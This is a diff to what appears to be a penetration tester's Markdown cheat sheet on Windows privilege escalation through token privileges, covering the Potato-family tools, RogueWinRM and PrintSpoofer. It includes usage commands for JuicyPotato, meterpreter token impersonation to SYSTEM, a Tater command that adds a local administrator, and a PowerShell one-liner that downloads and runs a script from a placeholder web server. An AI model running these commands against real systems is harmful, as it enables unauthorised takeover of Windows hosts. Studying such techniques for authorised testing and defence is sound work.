@@ -1268,7 +1268,7 @@ scripts.
 
 ### Token Privileges abuse
 
-###### Vulnerable privileges
+#### Vulnerable privileges
 
 Use the following command to retrieve the current user account token privileges:
 
@@ -1279,28 +1279,48 @@ whoami /priv | findstr /i /C:"SeImpersonatePrivilege" /C:"SeAssignPrimaryPrivile
 ```
 
 The following tokens can be exploited to gain SYSTEM access privileges:
-- `SeImpersonatePrivilege`
 - `SeAssignPrimaryPrivilege`
-- `SeTcbPrivilege`
 - `SeBackupPrivilege`
-- `SeRestorePrivilege`
 - `SeCreateTokenPrivilege`
-- `SeLoadDriverPrivilege`
-- `SeTakeOwnershipPrivilege`
 - `SeDebugPrivilege`
+- `SeImpersonatePrivilege`
+- `SeLoadDriverPrivilege`
+- `SeManageVolumePrivilege`
+- `SeRestorePrivilege`
+- `SeTakeOwnershipPrivilege`
+- `SeTcbPrivilege`
+
+For more and updated information on the aforementioned privileges, refer to the
+[Priv2Admin](https://github.com/gtworek/Priv2Admin) GitHub repository.
+
+#### SeAssignPrimaryPrivilege / SeImpersonatePrivilege
+
+###### Overview
+
+The `SeAssignPrimaryTokenPrivilege` and the `SeImpersonatePrivilege`
+privileges allow, by design, to create a process under the security context of
+another user. The `SeAssignPrimaryTokenPrivilege` privilege can be exploited
+using the `CreateProcessAsUser()` Win32 API while the `SeImpersonatePrivilege`
+privilege can leveraged using the `CreateProcessWithToken()` Win32 API.
+
+The process creation requires however a handle to a primary token of the user
+to impersonate. Multiple tools and techniques may be used to obtain a handle
+to a token of the `NT AUTHORITY\SYSTEM` account:
+
+| Tool(s) | Description | Technique limitation |
+|---------|-------------|----------------------|
+| Potato family ([`Potato`](https://github.com/foxglovesec/Potato), [`RottenPotatoNG`](https://github.com/breenmachine/RottenPotatoNG), [`Juicy Potato`](https://github.com/ohpe/juicy-potato)) | Induces the SYSTEM account to connect to a controlled `RPC` endpoint using the `CoGetInstanceFromIStorage ` `COM` API function. <br> In `Potato` and `RottenPotatoNG`, the call was used to instantiate a `COM Storage Object` of the `BITS` local service. In `Juicy Potato`, an instance of the service specified in parameter, using its `Class Identifier (CLSID)`, is requested. <br><br> Then the packets received by the controlled RPC endpoint are relayed to the `MSRPC` endpoint (on port TCP 135) until an NTLM authentication attempt of the SYSTME account is received. <br><br> The `NTLM` authentication attempt is replayed using Windows API calls (`AcquireCredentialsHandle` and `AcceptSecurityContext`) to ultimately obtain a token for the SYSTEM account. | Restriction applied starting from the Windows 10 1809 and Windows Server 2019 operating system mitigate this attack. <br><br> Indeed the port contacted by the `COM` API function is now fixed to the `MSRPC` endpoint and can not longer be specified, resulting in an impossibility to intercept the NTLM authentication attempt. |
+| [`RogueWinRM`](https://github.com/antonioCoco/RogueWinRM) | Exploit the fact that upon starting the `BITS` service attempt an NTLM authentication to the `WinRM` service (on port 5985). <br><br> Similarly to the exploitation process of tools from the Potato family, the `NTLM` authentication attempt is relayed through Windows API calls to obtain a token for the SYSTEM account. | Requires that the `WinRM` service is not running (default configuration on Windows workstation operating systems, including Windows 10, but not on Windows server operating systems). |
+| [`PrintSpoofer`](https://github.com/itm4n/PrintSpoofer) | | |
 
 ###### Juicy Potato
 
-`Juicy Potato` is an improved version of `RottenPotatoNG` that allows for
-privilege escalation to `NT AUTHORITY\SYSTEM` from any account having the
-`SeImpersonate` or `SeAssignPrimaryToken` privileges.
+*`Juicy Potato` is an improved version of `RottenPotatoNG` and its usage is
+recommended.*
 
-`RottenPotatoNG`, and its variants, leverages a privilege escalation chain
-based on the `BITS` service, while `Juicy Potato` can use the service
-specified as parameter, using its `Class Identifier (CLSID)`.  
-
-A list of services' `CLSID` that can be leveraged for privilege escalation is
-available on the tool GitHub repository:
+As stated above, the specification of service `CLSID` is required by `Juicy
+Potato`. A list of services' `CLSID` that can be leveraged for privilege
+escalation is available on the tool GitHub repository:
 `https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md`
 
 ```
@@ -1314,11 +1334,8 @@ JuicyPotato.exe -t * -c <CLSID> -l <PORT> -p <cmd.exe | powershell.exe | BINARY>
 
 ###### Rotten Potato x64 w/ Metasploit
 
-`RottenPotato` can be used in combination with the `Metasploit` `meterpreter`
-incognito module to abuse the privileges above in order to elevate privilege to
-SYSTEM.
-
-Source: https://github.com/breenmachine/RottenPotatoNG
+On unpatched systems, `RottenPotato` can be used in combination with the
+`Metasploit` `meterpreter`'s `incognito module`.
 
 ```
 # Load the incognito module to toy with tokens
@@ -1337,12 +1354,10 @@ meterpreter > list_tokens -u
 meterpreter > impersonate_token 'NT AUTHORITY\SYSTEM'
 ```
 
-###### LonelyPottato (RottenPotato w/o Metasploit)
-
 ###### Tater
 
-`Tater` is a `PowerShell` implementation of the Hot Potato Windows Privilege
-Escalation exploit.
+`Tater` is a `PowerShell` implementation of the `Potato` exploit and thus works
+similarly by targeting the `BITS` service.
 
 ```
 # Import module (Import-Module or dot source method)
@@ -1357,10 +1372,6 @@ Invoke-Tater -Command "net user <USERNAME> <PASSWORD> /add && net localgroup adm
 # Memory injection and run
 powershell -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('http://<WEBSERVER_IP>:<WEBSERVER_PORT>/Tater.ps1'); Invoke-Tater -Command <POWERSHELLCMD>;
 ```
-
-###### TODO
-
-https://2018.romhack.io/slides/RomHack%202018%20-%20Andrea%20Pierini%20-%20whoami%20priv%20-%20show%20me%20your%20Windows%20privileges%20and%20I%20will%20lead%20you%20to%20SYSTEM.pdf
 
 --------------------------------------------------------------------------------
 ### Windows Subsystem for Linux (WSL) - TODO
